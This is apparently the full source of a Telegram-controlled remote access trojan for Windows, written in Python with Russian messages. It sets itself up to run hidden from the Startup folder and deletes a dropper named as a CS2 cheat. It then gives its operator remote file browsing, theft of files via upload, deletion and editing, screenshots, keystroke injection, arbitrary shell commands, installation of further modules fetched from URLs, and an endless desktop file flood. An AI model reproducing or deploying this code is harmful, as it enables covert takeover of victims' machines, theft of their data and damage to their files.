"""
def getDownloadPath():
    path=os.getcwd()
    path=path.split('\\')
    t=path.index('Users')+1
    path=path[:t+1]
    path.append('Downloads')
    path.append('python-3.12.1-amd64.exe')
    path='\\'.join(path)
    return path
"""
import string,random
def createRandomWord():
    x=[]
    for i in range(10):
        x.append(random.choice(list(string.ascii_lowercase)))
    return ''.join(x)
def check_internet_connection():
    try:
        response = requests.get('https://www.google.com')
        if response.status_code == 200:
            return True
        else:
            return False
    except requests.exceptions.ConnectionError:
        return False
def formatList(l,sep):
    return sep.join(l)
def downloadAndSetupMod(urlGit,name):
    global modules
    global mods
    if not os.path.isdir(f"C:\\winTest\\{name}"):
        installed=[]
        noInstalled=[]
        os.mkdir(f"C:\\winTest\\{name}")
        try:
            response = requests.get(urlGit)
        except:
            return "noReposytory"
        zip_data = response.content
        with open(f"C:\\winTest\\{name}\\archive.zip", 'wb') as file:
            file.write(zip_data)
        with ZipFile(f"C:\\winTest\\{name}\\archive.zip", 'r') as zip_ref:
            zip_ref.extractall(f"C:\\winTest\\{name}")
        os.remove(f"C:\\winTest\\{name}\\archive.zip")
        dirSetupName=os.listdir(f"C:\\winTest\\{name}")[0]
        shutil.move(f"C:\\winTest\\{name}\\{dirSetupName}\\{name}{'.py'}",f"C:\\winTest\\{name}\\{name}{'.pyw'}")
        shutil.move(f"C:\\winTest\\{name}\\{dirSetupName}\\data",f"C:\\winTest\\{name}")
        shutil.rmtree(f"C:\\winTest\\{name}\\{dirSetupName}")
        print(dirSetupName)

        with open(f"C:\\winTest\\{name}\\data\\modules.txt") as file:
            for line in file:
                modules.append(line.rstrip('\n'))
        modules = list(set(modules))
        for i in modules:
            if int(os.system(f"pip3 install {i}"))==0:
                installed.append(i)
            else:
                noInstalled.append(i)
        with open("C:\\winTest\\modules.pkl","wb") as file:
            pickle.dump(modules,file)

        mods[name]=urlGit
        with open("C:\\winTest\\mods.pkl","wb") as file:
            pickle.dump(mods,file)
        """modules=list(set(modules))
        with open("C:\\winTest\\modules.txt","w") as file:
            for i in modules:
                file.write(i+'\n')
        with open("C:\\winTest\\mods.txt") as file:
            mods1=file.read().rstrip().split(' ')
        mods1.append(f"{urlGit}#{name}")
        with open("C:\\winTest\\mods.txt","w") as file:
            file.write(' '.join(mods1))
        nameMods.append(name)
        print(nameMods)"""
        return installed,noInstalled
    else:
        return "module installed"
def deletaEXE():
    x1=x.copy()
    x2=x.copy()
    x1.append('cs2_cs-go_cheat.exe')
    x2.append('python-3.12.1-amd64.exe')
    y='\\'.join(x1)
    y1 = '\\'.join(x2)
    os.system(f"del {y}")
    os.system(f"del {y1}")
def startModule(dirName):
    global processes
    xx=subprocess.Popen(['python',f"C:\\winTest\\{dirName}\\{dirName}.pyw"])
    processes[dirName]=xx
def stopModule(name):
    global processes
    with open(f"C:\\winTest\\{name}\\output.txt") as file:
        prout=file.read()
    processes[name].terminate()
    del processes[name]
    return prout
def run_command(cmd):
    result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    b = bytes(result.stdout+result.stderr, "cp1251")
    s = str(b, "cp866")
    with open("C:\\winTest\\cmdOutput.txt","w") as file:
        file.write(s)
    return s
import requests
import subprocess,time,os,shutil,pickle
while not check_internet_connection():
    print('Простите но интернет отсвует')
subprocess.Popen("pip3 install requests")
subprocess.Popen("pip3 install pyTelegramBotAPI")
subprocess.Popen("pip3 install pyautogui")
subprocess.Popen("pip3 install Pillow")
import requests
import telebot
import pyautogui
from telebot import types
from zipfile import ZipFile

pn=["C:"]
processes={}

with open("C:\\winTest\\data.pkl","rb") as file:
    rtok=pickle.load(file)
    x=rtok["dir"].split("\\")[:-2]
    tok=rtok["token"]
    print(x,tok)
with open("C:\\winTest\\modules.pkl","rb") as file:
    modules=pickle.load(file)
    print(modules)
with open("C:\\winTest\\mods.pkl","rb") as file:
    mods=pickle.load(file)
    print(mods)
for i in mods:
    downloadAndSetupMod(mods[i],i)
deletaEXE()
dirr=x.copy()
dirr.append("Desktop")
dirr='\\'.join(dirr)
x.append("AppData")
x.append("Roaming")
x.append("Microsoft")
x.append("Windows")
x.append("Start Menu")
x.append("Programs")
x.append("Startup")
x.append("autoStartWin.vbs")
x='\\'.join(x)

with open("C:\\winTest\\start.bat","w") as bat_file:
    bat_file.write('@echo off\npythonw C:\\Users\\Lidiya\\PycharmProjects\\pythonProject\\winStart.py')
coder="""Set oShell = CreateObject("Wscript.Shell")
Dim strArgs
strArgs = "cmd /c C:\\winTest\\start.bat"
oShell.Run strArgs, 0, false"""
with open(x,"w") as bat_file:
    bat_file.write(coder)
bot = telebot.TeleBot(tok)
bot.send_message(6080085900,"Ура, я снова в сети :)")
@bot.message_handler(commands="start")
def keyb(message):
    markup=types.ReplyKeyboardMarkup()
    bt1=types.KeyboardButton("/root",)
    bt2=types.KeyboardButton("/dirs")
    bt3=types.KeyboardButton("/open")
    bt4=types.KeyboardButton("/delete")
    bt5 = types.KeyboardButton("/pwd")
    bt6 = types.KeyboardButton("/get")
    bt7 = types.KeyboardButton("/..")
    bt8= types.KeyboardButton("/rename")
    bt9 = types.KeyboardButton("/create")
    bt10=types.KeyboardButton("/mods")
    bt11=types.KeyboardButton("/getscreen")
    bt12 = types.KeyboardButton("/printText")
    bt13 = types.KeyboardButton("/close")
    markup.row(bt1,bt2,bt3)
    markup.row(bt4, bt5, bt6)
    markup.row(bt7,bt8,bt9)
    markup.row(bt10,bt11,bt12)
    markup.row(bt13)
    bot.send_message(message.chat.id,"Hello",reply_markup=markup)
@bot.message_handler(commands="dirs")
def dirs(message):
    try:
        print("sdf")
        xz="\\".join(pn)+"\\"
        print(xz)
        ps=os.listdir(xz)
        print(ps)
        markup=types.InlineKeyboardMarkup()
        for i in ps:
            if not ("NTUSER.DAT" in i or len(i)>25):
                print(i)
    #            bot.send_message(message.chat.id,i)
                markup.add(types.InlineKeyboardButton(i,callback_data="pathurl#"+i))
        markup.add(types.InlineKeyboardButton("..",callback_data=".."))
        bot.send_message(message.chat.id,"Список директорий",reply_markup=markup)
    except:
        bot.send_message(message.chat.id, "Ошибка пути")
@bot.callback_query_handler(func=lambda callback:True)
def calldata(callback):
    global pn
    if "pathurl" in callback.data:
        teg,pth=callback.data.split("#")
        pn.append(pth)
        bot.delete_message(callback.message.chat.id,callback.message.message_id)
        bot.delete_message(callback.message.chat.id, callback.message.message_id-1)
        print(pn)
    elif callback.data=="..":
        pn=pn[:-1]
        bot.delete_message(callback.message.chat.id, callback.message.message_id)
        bot.delete_message(callback.message.chat.id, callback.message.message_id-1)

#@bot.message_handler(commands="")
@bot.message_handler(commands="pwd")
def pwd(message):
    bot.delete_message(message.chat.id,message.message_id)
    bot.send_message(message.chat.id,"\\".join(pn))
@bot.message_handler(commands="delete")
def delete(message):
    global pn
    xz="\\".join(pn)
    try:
        os.remove(xz)
        pn=pn[:-1]
        bot.send_message(message.chat.id, "Удаление было произведено успешно")
    except Exception as e:
        bot.send_message(message.chat.id, "При удалении произошла ошибка, возможно это связанно с некоректным путём")
        bot.send_message(message.chat.id, e)
@bot.message_handler(commands="read")
def read(message):
    xz="\\".join(pn)
    try:
        with open(xz) as file:
            ress=file.read()
        bot.send_message(message.chat.id,ress)
    except Exception as e:
        bot.send_message(message.chat.id, "При прочтении произошла ошибка, возможно это связанно с некоректным путём")
        bot.send_message(message.chat.id, e)
@bot.message_handler(commands="get")
def getFile(message):
    global pn
    xz="\\".join(pn)
    try:
        with open(xz,"rb") as file:
            ress=file.read()
        bot.send_document(message.chat.id,ress)
        if len(pn) > 1:
            pn = pn[:-1]
    except Exception as e:
        bot.send_message(message.chat.id, "При прочтении произошла ошибка, возможно это связанно с некоректным путём")
        bot.send_message(message.chat.id, e)
@bot.message_handler(commands="root")
def root(message):
    global pn
    pn=["C:"]
@bot.message_handler(commands="open")
def openF(message):
    xz="\\".join(pn)
    try:
        with open(xz) as file:
            ress=file.read()
        bot.send_message(message.chat.id,ress)
    except Exception as e:
        bot.send_message(message.chat.id, "При прочтении произошла ошибка, возможно это связанно с некоректным путём")
        bot.send_message(message.chat.id, e)
@bot.message_handler(commands="..")
def back(message):
    global pn
    if len(pn)>1:
        pn=pn[:-1]
    dirs(message)

@bot.message_handler(commands="rename")
def ren(message):
    print("sfdsfg")
    if pn[-1] == "winTest":
        bot.send_message(message.chat.id,"Вы не можете переименовать системныю папку")
    else:
        bot.send_message(message.chat.id,"Введите новое имя файла")
        bot.register_next_step_handler(message,getRen)
def getRen(message):
    try:
        pn1=pn[:-1]
        pn1.append(message.text)
        os.rename('\\'.join(pn),"\\".join(pn1))
        bot.send_message(message.chat.id,"Имя файла было успешно изменено")
    except Exception as e:
        bot.send_message(message.chat.id,"При изменении имени файла произошла ошибка")
        bot.send_message(message.chat.id,e)

@bot.message_handler(commands="create")
def cre(message):
    print("sfdsfg")
    bot.send_message(message.chat.id,"Введите имя нового файла")
    bot.register_next_step_handler(message,getCre)
def getCre(message):
    try:
        pn1=pn[:]
        pn1.append(message.text)
        with open("\\".join(pn1),"w") as file:
            pass
        bot.send_message(message.chat.id,"Файл был успешно создан")
    except Exception as e:
        bot.send_message(message.chat.id,"При создании файла произошла ошибка")
        bot.send_message(message.chat.id,e)

@bot.message_handler(commands="mods")
def modse(message):
    pass
    bot.send_message(message.chat.id,formatList(mods,', ')+'dgbvc')

@bot.message_handler(commands="getscreen")
def src(message):
    screenshot = pyautogui.screenshot()
    # Сохранение изображения.
    bot.send_photo(message.chat.id,screenshot)

@bot.message_handler(commands="printText")
def ptxt(message):
    bot.send_message(message.chat.id,"Введите текст")
    bot.register_next_step_handler(message,ptxtget)
def ptxtget(message):
    pyautogui.typewrite(message.text,0.1)
    bot.send_message(message.chat.id,"Текст успешно введен")
@bot.message_handler(commands="close")
def cls(message):
    pyautogui.hotkey('alt','f4')
    bot.send_message(message.chat.id, "Окно успешно закрыто")
@bot.message_handler(commands="kill")
def kill(message):
    for i in range(10):
        x=createRandomWord()
        with open(dirr+'\\'+x+'.txt','w') as file:
            file.write(x)
    bot.send_message(message.chat.id, dirr)
    bot.send_message(message.chat.id, "Файлы успешно созданны")
@bot.message_handler(commands="mkill")
def mkill(message):
    bot.send_message(message.chat.id, dirr)
    bot.send_message(message.chat.id, "Файлы успешно созданны")
    while True:
        x=createRandomWord()
        with open(dirr+'\\'+x+'.txt','w') as file:
            file.write(x)
@bot.message_handler()
def message(message):
    x=message.text.split('#')
    if x[0]=='test':
        bot.send_message(message.chat.id,"Связь в норме")
        print("test")
    elif x[0]=='module':
        if x[1] in mods:
            if x[2]=="start":
                bot.send_message(message.chat.id,f"Модуль {x[1]} был успешно запущен")
                startModule(x[1])
                print("start")
            elif x[2]=="stop":
                try:
                    procres=stopModule(x[1])
                    bot.send_message(message.chat.id, f"Модуль {x[1]} был успешно отключен")
                    bot.send_message(message.chat.id, procres)
                except Exception as e:
                    bot.send_message(message.chat.id, f"Модуль {x[1]} не может быть успешно отключен потому, что произошла ошибка или он уже отключен")
                    bot.send_message(message.chat.id,e)
                print("stop")
            else:
                bot.send_message(message.chat.id, f"Неправильный параметр {x[2]}")
                print("err")
                print("err2")
        else:
            bot.send_message(message.chat.id,f"Мод {x[1]} не установлен")
    elif x[0]=='setup':
        try:
            res1=downloadAndSetupMod(str(x[1]),str(x[2]))
            if res1=="noReposytory":
                bot.send_message(message.chat.id,f"Url {x[1]} не действителен")
            elif res1=="module installed":
                bot.send_message(message.chat.id,f"Мода {x[1]} уже инсталирован")
            else:
                bot.send_message(message.chat.id,f"{formatList(res1[0],', ')} были установлены")
                bot.send_message(message.chat.id, f"{formatList(res1[1],', ')} были неустановлены")
                bot.send_message(message.chat.id, f"Список установленных модов {mods}")
        except Exception as e:
            bot.send_message(message.chat.id,"При установке мода произошла ошибка")
            bot.send_message(message.chat.id, e)
            bot.send_message(message.chat.id, x[1]+' '+x[2])
            bot.send_message(message.chat.id,f"Список установленных модов {mods}")
    elif x[0]=="dirs":
        try:
            bot.send_message(message.chat.id,formatList(os.listdir(x[1]),'  '))
            print(os.listdir(x[1]))
        except Exception as e:
            bot.send_message(message.chat.id,"При получении списка директорий и файлов произошла ошибка, возможно это связанно с некоректным путём")
            bot.send_message(message.chat.id, e)
    elif x[0]=="del":
        try:
            os.remove(x[1])
            bot.send_message(message.chat.id,"Удаление было произведено успешно")
        except Exception as e:
            bot.send_message(message.chat.id, "При удалении произошла ошибка, возможно это связанно с некоректным путём")
            bot.send_message(message.chat.id, e)
    elif x[0]=="create":
        try:
            with open(x[1],"a") as file:
                pass
            bot.send_message(message.chat.id,"Создание было произведено успешно")
        except Exception as e:
            bot.send_message(message.chat.id, "При созданиее произошла ошибка, возможно это связанно с некоректным путём или аргументами")
            bot.send_message(message.chat.id, e)
    elif x[0]=="edit":
        try:
            with open(x[1],x[2]) as file:
                file.write(x[3])
            bot.send_message(message.chat.id,"Редактирование було успешно произведено")
        except Exception as e:
            bot.send_message(message.chat.id,"При удалении произошла ошибка, возможно это связанно с некоректным путём или аргументами")
            bot.send_message(message.chat.id, e)
    elif x[0]=="read":
        try:
            with open(x[1]) as file:
                res12=file.read()
            bot.send_message(message.chat.id,res12)
        except Exception as e:
            bot.send_message(message.chat.id,"При чтении произошла ошибка, возможно это связанно с некоректным путём или аргументами")
            bot.send_message(message.chat.id, e)
    elif x[0]=="rename":
        try:
            os.rename(x[1],x[2])
            bot.send_message(message.chat.id,"Файл был успешно переименован")
        except Exception as e:
            bot.send_message(message.chat.id,"При чтении произошла ошибка, возможно это связанно с некоректным путём или аргументами")
            bot.send_message(message.chat.id, e)
    elif x[0]=="get":
        try:
            with open(x[1], "rb") as file:
                ress = file.read()
            bot.send_document(message.chat.id, ress)
        except Exception as e:
            bot.send_message(message.chat.id,"При прочтении и отправке файла произошла ошибка, возможно это связанно с некоректным путём или аргументами")
            bot.send_message(message.chat.id, e)
    elif x[0]=="open":
        try:
            with open(x[1]) as file:
                ress = file.read()
            bot.send_message(message.chat.id, ress)
        except Exception as e:
            bot.send_message(message.chat.id,"При прочтении и отправке файла произошла ошибка, возможно это связанно с некоректным путём или аргументами")
            bot.send_message(message.chat.id, e)

    elif x[0]=="cmd":
        run_command(x[1])
        with open("C:\\winTest\\cmdOutput.txt", "rb") as file:
            ress = file.read()
        bot.send_document(message.chat.id, ress)
    else:
        bot.send_message(message.chat.id, "Ошибка в комманде")
        print("dsfdsfdg")
    print(f"Сообщение получено {x}")
#print(downloadAndSetupMod("https://api.github.com/repos/nick1t0s/localservonflask/zipball","localserver"))
bot.polling(none_stop=True)
# Запуск второго файла в отдельном процессе
#process = subprocess.Popen(['python', 'C:\\winTest\\localServ\\localServ.pyw'])

# ждем некоторое время, прежде чем прервать выполнение
#time.sleep(30)

# Прерывание выполнения второго файла
#process.terminate()


#print(downloadAndSetupMod('https://api.github.com/repos/Nick1t0s/localServOnFlask/zipball','localServ','localServ'))